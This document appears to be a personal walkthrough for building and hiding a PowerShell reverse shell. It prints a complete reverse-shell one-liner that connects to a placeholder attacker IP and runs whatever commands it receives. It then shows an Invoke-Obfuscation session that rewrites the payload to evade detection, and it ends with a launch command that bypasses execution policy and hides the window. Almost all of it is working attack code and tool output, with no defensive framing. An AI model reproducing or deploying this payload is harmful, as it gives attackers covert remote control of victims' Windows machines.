

# Create a payload

https://www.revshells.com/


this payload is payload #2 from the revshell website

```
powershell -nop -c "$client = New-Object System.Net.Sockets.TCPClient('xxx.xxx.xxx.xxx',1111);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()"
```


The next step would be to use the invoking to actually getting things moving

```
HELP MENU :: Available options shown below:                                                                                                                                                                                                

[*]  Tutorial of how to use this tool             TUTORIAL
[*]  Show this Help Menu                          HELP,GET-HELP,?,-?,/?,MENU
[*]  Show options for payload to obfuscate        SHOW OPTIONS,SHOW,OPTIONS
[*]  Clear screen                                 CLEAR,CLEAR-HOST,CLS
[*]  Execute ObfuscatedCommand locally            EXEC,EXECUTE,TEST,RUN
[*]  Copy ObfuscatedCommand to clipboard          COPY,CLIP,CLIPBOARD
[*]  Write ObfuscatedCommand Out to disk          OUT
[*]  Reset ALL obfuscation for ObfuscatedCommand  RESET
[*]  Undo LAST obfuscation for ObfuscatedCommand  UNDO
[*]  Go Back to previous obfuscation menu         BACK,CD ..
[*]  Quit Invoke-Obfuscation                      QUIT,EXIT
[*]  Return to Home Menu                          HOME,MAIN


Choose one of the below options:

[*] TOKEN       Obfuscate PowerShell command Tokens
[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
[*] STRING      Obfuscate entire command as a String
[*] ENCODING    Obfuscate entire command via Encoding
[*] COMPRESS    Convert entire command to one-liner and Compress
[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)


Invoke-Obfuscation> SET SCRIPTPATH /home/kali/script.ps1        <----------------------------------------------   My input

                                                                                                                                                                                                                                           
Successfully set ScriptPath:                                                                                                                                                                                                               
/home/kali/script.ps1                                                                                                                                                                                                                        
                                                                                                                                                                                                                                           

Choose one of the below options:

[*] TOKEN       Obfuscate PowerShell command Tokens
[*] AST         Obfuscate PowerShell Ast nodes (PS3.0+)
[*] STRING      Obfuscate entire command as a String
[*] ENCODING    Obfuscate entire command via Encoding
[*] COMPRESS    Convert entire command to one-liner and Compress
[*] LAUNCHER    Obfuscate command args w/Launcher techniques (run once at end)


Invoke-Obfuscation> AST         <----------------------------------------------   My input


Choose one of the below AST options:

[*] AST\NamedAttributeArgumentAst       Obfuscate NamedAttributeArgumentAst nodes
[*] AST\ParamBlockAst                   Obfuscate ParamBlockAst nodes
[*] AST\ScriptBlockAst                  Obfuscate ScriptBlockAst nodes
[*] AST\AttributeAst                    Obfuscate AttributeAst nodes
[*] AST\BinaryExpressionAst             Obfuscate BinaryExpressionAst nodes
[*] AST\HashtableAst                    Obfuscate HashtableAst nodes
[*] AST\CommandAst                      Obfuscate CommandAst nodes
[*] AST\AssignmentStatementAst          Obfuscate AssignmentStatementAst nodes
[*] AST\TypeExpressionAst               Obfuscate TypeExpressionAst nodes
[*] AST\TypeConstraintAst               Obfuscate TypeConstraintAst nodes
[*] AST\ALL                             Select All choices from above


Invoke-Obfuscation\AST> all           <----------------------------------------------   My input


Choose one of the below AST\All options to APPLY to current payload:

[*] AST\ALL\1           Execute ALL Ast obfuscation techniques
Invoke-Obfuscation\AST\All> 1           <----------------------------------------------   My input

Executed:
  CLI:  AST\All\1
  FULL: Out-ObfuscatedAst -ScriptBlock $ScriptBlock                                                                                                                                                                                        
                                                                                                                                                                                                                                           
Result:
Set-Variable -Name client -Value (New-Object System.Net.Sockets.TCPClient('xxx.xxx.xxx.xxx',1111));Set-Variable -Name stream -Value ($client.GetStream());[byte[]]$bytes = 0..65535|%{0};while((Set-Variable -Name i -Value ($stream.Read($bytes, 0, $bytes.Length))) -ne 0){;Set-Variable -Name data -Value ((New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i));Set-Variable -Name sendback -Value (iex $data 2>&1 | Out-String );Set-Variable -Name sendback2 -Value ($sendback + 'PS ' + (pwd).Path + '> ');Set-Variable -Name sendbyte -Value (([text.encoding]::ASCII).GetBytes($sendback2));$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()                                 

```


so now we proceed by taking this and we dump it basically in a file, call it whatever you want but for our case we call it script2.ps1, this command basically has a bypass to execute the script and it also has a hidden windowstyle tag which means that the window would not pop up

```
powershell -ExecutionPolicy Bypass -WindowStyle Hidden -File "C:\Users\admin\desktop\script2.ps1"
```


